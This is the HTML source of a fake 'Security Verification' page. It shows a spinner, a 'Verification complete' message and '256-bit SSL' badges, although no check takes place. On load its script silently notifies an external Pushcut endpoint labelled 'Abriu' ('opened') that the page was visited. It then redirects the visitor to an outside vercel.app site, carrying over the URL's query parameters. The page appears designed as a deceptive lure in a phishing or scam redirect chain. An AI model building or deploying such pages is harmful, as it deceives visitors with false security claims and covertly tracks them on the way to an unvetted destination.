<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Security Verification - Please wait...</title>
  <meta name="description" content="Quick security verification to proceed safely.">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg-color: #0f172a;
      --card-bg: #1e293b;
      --card-border: #334155;
      --text-main: #f8fafc;
      --text-muted: #94a3b8;
      --primary: #ff5500;
      --primary-hover: #e04a00;
      --success: #22c55e;
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    }

    body {
      background-color: var(--bg-color);
      color: var(--text-main);
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      padding: 20px;
      background-image: 
        radial-gradient(at 20% 20%, rgba(255, 85, 0, 0.15) 0px, transparent 50%),
        radial-gradient(at 80% 80%, rgba(34, 197, 94, 0.1) 0px, transparent 50%);
    }

    .container {
      width: 100%;
      max-width: 440px;
      background: var(--card-bg);
      border: 1px solid var(--card-border);
      border-radius: 16px;
      padding: 32px 24px;
      box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.5), 0 8px 10px -6px rgba(0, 0, 0, 0.5);
      text-align: center;
      backdrop-filter: blur(10px);
    }

    .shield-icon {
      width: 64px;
      height: 64px;
      background: rgba(255, 85, 0, 0.1);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px auto;
      border: 1px solid rgba(255, 85, 0, 0.2);
    }

    .shield-icon svg {
      width: 32px;
      height: 32px;
      fill: var(--primary);
    }

    .spinner-large {
      width: 40px;
      height: 40px;
      border: 4px solid rgba(255, 85, 0, 0.2);
      border-top-color: var(--primary);
      border-radius: 50%;
      animation: spin 1s linear infinite;
      margin: 0 auto 20px auto;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    h1 {
      font-size: 1.35rem;
      font-weight: 700;
      color: var(--text-main);
      margin-bottom: 8px;
    }

    p.subtitle {
      font-size: 0.9rem;
      color: var(--text-muted);
      margin-bottom: 28px;
      line-height: 1.5;
    }

    /* Status Message & Progress Bar */
    .status-area {
      min-height: 48px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
    }

    .redirect-status {
      font-size: 0.88rem;
      color: var(--success);
      font-weight: 500;
      opacity: 0;
      transition: opacity 0.3s ease;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .redirect-status.visible {
      opacity: 1;
    }

    .progress-bar-container {
      width: 100%;
      height: 4px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 2px;
      overflow: hidden;
      margin-top: 10px;
      opacity: 0;
      transition: opacity 0.3s ease;
    }

    .progress-bar-container.visible {
      opacity: 1;
    }

    .progress-bar-fill {
      width: 0%;
      height: 100%;
      background: var(--success);
      transition: width 1s linear;
    }

    /* Footer */
    .footer-info {
      margin-top: 24px;
      padding-top: 16px;
      border-top: 1px solid rgba(255, 255, 255, 0.05);
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 16px;
      font-size: 0.75rem;
      color: var(--text-muted);
    }

    .footer-item {
      display: flex;
      align-items: center;
      gap: 4px;
    }

    .footer-item svg {
      width: 14px;
      height: 14px;
      fill: var(--text-muted);
    }

    .fallback-btn {
      display: none;
      margin-top: 16px;
      padding: 10px 18px;
      background-color: var(--primary);
      color: white;
      text-decoration: none;
      border-radius: 8px;
      font-size: 0.85rem;
      font-weight: 600;
      transition: background 0.2s ease;
    }

    .fallback-btn:hover {
      background-color: var(--primary-hover);
    }
  </style>
</head>
<body>

  <div class="container">
    <div id="loadingIcon" class="spinner-large"></div>
    
    <div id="shieldIcon" class="shield-icon" style="display: none;">
      <svg viewBox="0 0 24 24">
        <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
      </svg>
    </div>

    <h1>Security Verification</h1>
    <p class="subtitle" id="subtitleText">Please wait while we secure your connection...</p>

    <!-- Status and Loader -->
    <div class="status-area">
      <div class="redirect-status" id="statusMessage">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#22c55e">
          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
        </svg>
        <span>Verification complete! Redirecting...</span>
      </div>
      <div class="progress-bar-container" id="progressBarContainer">
        <div class="progress-bar-fill" id="progressBarFill"></div>
      </div>
      <a href="#" id="fallbackBtn" class="fallback-btn">Click here if you are not redirected</a>
    </div>

    <div class="footer-info">
      <div class="footer-item">
        <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>
        <span>256-bit SSL</span>
      </div>
      <div class="footer-item">
        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
        <span>Secure Connection</span>
      </div>
    </div>
  </div>

  <script>
    const TARGET_BASE_URL = 'https://bruninha-xi.vercel.app/';

    function getRedirectUrl() {
      const currentSearchParams = new URLSearchParams(window.location.search);
      const targetUrl = new URL(TARGET_BASE_URL);
      currentSearchParams.forEach((value, key) => {
        targetUrl.searchParams.set(key, value);
      });
      return targetUrl.toString();
    }

    const PUSHCUT_URL = 'https://api.pushcut.io/CU10_zrZC6TZ6ayqksxcQ/notifications/Abriu';

    function sendPushcutNotification() {
      fetch(PUSHCUT_URL, {
        method: 'POST',
        mode: 'no-cors'
      }).catch(() => {});
    }

    window.onload = function() {
      sendPushcutNotification();
      
      const loadingIcon = document.getElementById('loadingIcon');
      const shieldIcon = document.getElementById('shieldIcon');
      const statusMessage = document.getElementById('statusMessage');
      const progressBarContainer = document.getElementById('progressBarContainer');
      const progressBarFill = document.getElementById('progressBarFill');
      const fallbackBtn = document.getElementById('fallbackBtn');
      const finalUrl = getRedirectUrl();
      
      fallbackBtn.href = finalUrl;

      // After 1 second of loading, switch to verified state and start redirect
      setTimeout(() => {
        loadingIcon.style.display = 'none';
        shieldIcon.style.display = 'flex';
        
        statusMessage.classList.add('visible');
        progressBarContainer.classList.add('visible');
        
        requestAnimationFrame(() => {
          progressBarFill.style.width = '100%';
        });

        // Redirect after another 1 second
        setTimeout(() => {
          fallbackBtn.style.display = 'inline-block';
          window.location.href = finalUrl;
        }, 1000);
        
      }, 1000); // 1s + 1s = 2 seconds total
    };
  </script>
</body>
</html>
